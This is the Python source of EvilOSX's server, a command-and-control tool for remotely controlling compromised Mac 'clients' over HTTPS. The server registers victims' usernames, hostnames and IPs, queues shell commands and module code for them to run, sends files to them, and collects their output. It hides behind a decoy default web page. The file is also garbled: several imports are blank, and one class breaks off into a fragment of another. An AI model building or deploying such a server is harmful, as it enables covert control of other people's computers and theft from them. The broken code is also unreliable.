#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Server which controls clients over the HTTPS protocol.

Provides only the communication layer, all other functionality is handled by modules.
"""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import threading
import sqlite3
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SocketServer import ThreadingMixIn
from urllib import unquote_plus
import ssl
import os
import time
import fnmatch
import imp
import
import 
import 
from sys import exit

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"


class Modules:
    """This handles models."""

    def __init__(self):
        self._modules = {"helpers": imp.load_source("helpers", "modules/helpers.py")}
        self._load_modules()

    def _load_modules(self):
        """Loads all modules."""
        for root, dirs, files in os.walk("modules"):
            for file_name in fnmatch.filter(files, "*.py"):
                module_name = file_name[0:-3]
                module_path = os.path.join(root, file_name)

                if module_name in ["__init__", "template", "helpers"]:
                    continue

                self._modules[module_name] = imp.load_source(module_name, module_path).Module()

    def get_modules(self):
        """:return A list of module classes."""
        return self._modules

    def get_module(self, module_name):
        """:return The module class of the specified name."""
        return self._modules[module_name]


class CommandType:
    """Enum class for command types."""
    COMMAND = "COMMAND"
    MODULE = "MODULE"

    def __init__(self):
        pass


class Command:
    """This class represents a command."""

    def __init__(self, client_id, command, command_type, module_name=""):
        self.id = client_id
        self.command = command
        self.type = command_type
        self.module_name = module_name


class Client:
    """This class represents a client."""

    def __init__(self, client_id, username, hostname, remote_ip, path, last_online):
        self.id = client_id
        self.username = username
        self.hostname = hostname
        self.remote_ip = remote_ip
        self.path = path
        self.last_online = last_online


class ClientController(BaseHTTPRequestHandler):
    """This class handles HTTPS requests and responses."""
    _model = None
    _modules = None

    def send_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_POST(self):
        """Handles POST requests."""
        data = str(self.rfile.read(int(self.headers.getheader("Content-Length"))))

        if self.path == "/api/get_command":
            # Command requests
            username = data.split("&")[0].replace("username=", "", 1)
            path = unquote_plus(data.split("&")[1].replace("path=", "", 1))
            hostname = data.split("&")[2].replace("hostname=", "", 1)
            client_id = data.split("&")[3].replace("client_id=", "", 1)
            remote_ip = data.split("&")[4].replace("remote_ip=", "", 1)

            client = self._model.get_client(client_id)

            if not client:
                # This is the first time this client has connected.
                print MESSAGE_INFO + "New client \"{0}@{1}\" connected!".format(username, hostname)

                self._model.add_client(Client(client_id, username, hostname, remote_ip, path, time.time()))
                self.send_headers()
                self.wfile.write("You dun goofed.")
            else:
                # Update the client's session (path and last_online).
                self._model.update_client(client_id, path, time.time())

                # Send any pending commands to the client.
                command = self._model.get_command(client_id)

                if command:
                    self._model.remove_command(command)

                    # Special modules which need the server to do extra stuff.
                    if command.module_name in ["update_client", "remove_client"]:
                        self._model.remove_client(client_id)

                        self.send_headers()
                        self.wfile.write("{0}|{1}|{2}".format(
                            command.type, command.module_name, command.command
                        ))
                    elif command.module_name == "upload":
                        file_path = base64.b64decode(command.command).split(":")[0].replace("\n", "")
                        file_name = os.path.basename(file_path)

                        print "\n" + MESSAGE_INFO + "Sending file to client..."

                        with open(file_path, "rb") as input_file:
                            file_size = os.fstat(input_file.fileno())

                            self.send_response(200)
                            self.send_header("Content-Type", "application/octet-stream")
                            self.send_header("Content-Disposition", "attachment; filename=\"{0}\"".format(file_name))
                            self.send_header("Content-Length", str(file_size.st_size))
                            self.send_header("X-Upload-Module", command.command)
                            self.end_headers()

                            shutil.copyfileobj(input_file, self.wfile)
                    else:
                        self.send_headers()
                        self.wfile.write("{0}|{1}|{2}".format(
                            command.type, command.module_name, command.command
                        ))
                else:
                    # Client has no pending commands.
                    self.send_headers()
                    self.wfile.write("")
        elif self.path == "/api/response":
            # Command responses
            full_response = base64.b64decode(unquote_plus(data.replace("output=", "", 1)))

            self.send_headers()

            try:
                response = base64.b64decode(full_response.split("|")[2])
                response_type = full_response.split("|")[0]
                response_module = full_response.split("|")[1]

                if response_type == CommandType.MODULE:
                    # Send the response back to the module
                    for module_name, module_imp in self._modules.get_modules().iteritems():
                        if module_name == response_module:
                            try:
                                module_imp.process_response(response)
                                break
                            except AttributeError:
                                # The module doesn't have a process_response method, that's fine.
                                print "\n" + response
                else:
                    # Command response
                    print "\n" + response
            except IndexError:
                # Any other response, like module errors.
                print "\n" + full_response

    def do_GET(self):
        self.send_headers()

        if self.path == "/api/get_ca":
            # Send back our certificate authority.
            with open("server_cert.pem") as input_file:
                self.wfile.write(base64.b64encode("".join(input_file.readlines())))
        else:
            # Show a standard looking page.
            page = """\
            <html><body><h1>It works!</h1>
            <p>This is the default web page for this server.</p>
            <p>The web server software is running but no content has been added, yet.</p>
            </body></html>
            """
            self.wfile.write(page)

    def handle(self):
        try:
            BaseHTTPRequestHandler.handle(self)
        except ssl.SSLError as ex:
            if "alert unknown ca" in str(ex):
                # See https://support.mozilla.org/en-US/kb/troubleshoot-SEC_ERROR_UNKNOWN_ISSUER
                print MESSAGE_ATTENTION + "Showing \"Your connection is not secure\" message to user."
            else:
                print MESSAGE_ATTENTION + str(ex)

    def log_message(self, format, *args):
        return  # Don't log random stuff we don't care about, thanks.


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
                    print "{0: <18} -   {1}".format(module_name, module_imp.info["Description"])
            elif command == "exit" and not self._current_client:
                print MESSAGE_INFO + "Goodbye!"
                self._model.close()
                break
            else:
                # Commands that require an active connection.
                if not self._current_client:
                    print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                else:
                    if (time.time() - float(self._current_client.last_online)) >= 60:
                        print MESSAGE_ATTENTION + "The client is idle and will take longer to respond."

                    if command.startswith("use"):
                        # Execute module
                        module_name = command.replace("use ", "").strip()

                        if module_name == "use":
                            print MESSAGE_ATTENTION + "Invalid module name (see \"modules\")."
                            print MESSAGE_ATTENTION + "Usage: use <module>"
                        else:
                            try:
                                module_imp = self._modules.get_module(module_name)

                                if module_imp.setup():
                                    print MESSAGE_INFO + "Running module \"{0}\"...".format(module_name)
                                    module_code = textwrap.dedent(module_imp.run())

                                    self._model.send_command(Command(
                                        self._current_client.id, module_code, CommandType.MODULE, module_name
                                    ))
                            except KeyError:
                                print MESSAGE_ATTENTION + "That module doesn't exist!"
                    elif command == "exit":
                        self._current_client = None
                    else:
                        # Execute a system command.
                        self._model.send_command(Command(self._current_client.id, command, CommandType.COMMAND))


class ClientModel:
    """This class stores client sessions and pending commands via SQLite."""

    def __init__(self):
        self._database = sqlite3.connect("EvilOSX.db", check_same_thread=False)
        self._cursor = self._database.cursor()
        self._lock = threading.Lock()  # We want all database operations synchronized.

        # Setup the database.
        self._cursor.execute("DROP TABLE IF EXISTS clients")
        self._cursor.execute("DROP TABLE IF EXISTS commands")
        self._cursor.execute("CREATE TABLE clients("
                             "client_id string PRIMARY KEY, "
                             "username text, "
                             "hostname text, "
                             "remote_ip text, "
                             "path text, "
                             "last_online text)")
        self._cursor.execute("CREATE TABLE commands("
                             "client_id string, "
                             "command text, "
                             "type text, "  # Can be either COMMAND or MODULE
                             "module_name text)")
        self._database.commit()

    def add_client(self, client):
        """Adds a client session."""
        self._lock.acquire()

        try:
            self._cursor.execute("INSERT INTO clients VALUES (?,?,?,?,?,?)",
                                 (client.id, client.username, client.hostname,
                                  client.remote_ip, client.path, client.last_online))
            self._database.commit()
        finally:
            self._lock.release()

    def get_client(self, client_id):
        """:return The client session of the specified ID, otherwise None."""
        self._lock.acquire()

        try:
            response = self._cursor.execute("SELECT * FROM clients WHERE client_id = ?",
                                            (client_id,)).fetchone()
            if response:
                return Client(response[0], response[1], response[2], response[3], response[4], response[5])
        finally:
            self._lock.release()

    def remove_client(self, client_id):
        """Removes the client session."""
        self._lock.acquire()

        try:
            self._cursor.execute("DELETE FROM clients WHERE client_id = ?",
                                 (client_id,))
            self._database.commit()
        finally:
            self._lock.release()

    def get_clients(self):
        """:return A list of all clients."""
        self._lock.acquire()
        clients = []

        try:
            response = self._cursor.execute("SELECT * FROM clients").fetchall()

            for row in response:
                clients.append(Client(row[0], row[1], row[2], row[3], row[4], row[5]))
        finally:
            self._lock.release()
        return clients

    def send_command(self, command):
        """Adds a command for the client to execute.

        :type command Command
        """
        self._lock.acquire()

        try:
            self._cursor.execute("INSERT INTO commands VALUES(?,?,?,?)",
                                 (command.id, base64.b64encode(command.command), command.type, command.module_name))
            self._database.commit()
        finally:
            self._lock.release()

    def remove_command(self, command):
        """Removes the first command so the next will be on top."""
        self._lock.acquire()

        try:
            self._cursor.execute("DELETE FROM commands WHERE client_id = ? AND command = ?",
                                 (command.id, command.command))
            self._database.commit()
        finally:
            self._lock.release()

    def get_command(self, client_id):
        """:return The first command in the list for the client to execute.

        Once the command is sent to the client remove_command should be called.
        """
        self._lock.acquire()

        try:
            response = self._cursor.execute("SELECT * FROM commands WHERE client_id = ?",
                                            (client_id,)).fetchone()
            if response:
                command = Command(response[0], response[1], response[2], response[3])
                return command
        finally:
            self._lock.release()

    def update_client(self, client_id, path, last_online):
        """Updates the client's path and last online time."""
        self._lock.acquire()

        try:
            self._cursor.execute("UPDATE clients SET path = ?, last_online = ? WHERE client_id = ?",
                                 (path, last_online, client_id))
            self._database.commit()
        finally:
            self._lock.release()

    def close(self):
        """Closes the database."""
        self._database.close()


def generate_ca():
    """Generates the self-signed certificate authority."""
    if not os.path.exists("server_cert.pem"):
        print MESSAGE_INFO + "Generating certificate authority (HTTPS)..."

        information = "/C=US/ST=New York/L=Brooklyn/O=EvilOSX/CN=EvilOSX"
        os.popen("openssl req -newkey rsa:4096 -nodes -x509 -days 365 -subj \"{0}\" -sha256 "
                 "-keyout server_key.pem -out server_cert.pem".format(information))


def main():
    print BANNER

    while True:
        try:
            server_port = int(raw_input(MESSAGE_INPUT + "Server port to listen on: "))
            break
        except ValueError:
            # For that one guy that doesn't know what a port is.
            continue

    generate_ca()

    model = ClientModel()
    modules = Modules()
    view = View(model, modules)

    # Via __init__ is a pain, trust me...
    ClientController._model = model
    ClientController._modules = modules

    # Start the multi-threaded HTTP server in it's own thread.
    server = ThreadedHTTPServer(('', server_port), ClientController)
    server.socket = ssl.wrap_socket(server.socket, keyfile="server_key.pem", certfile="server_cert.pem",
                                    server_side=True)

    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True  # Exit when the main method finishes.
    server_thread.start()

    # Start the view.
    view.run()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "\n" + MESSAGE_INFO + "Interrupted."
        exit(0)
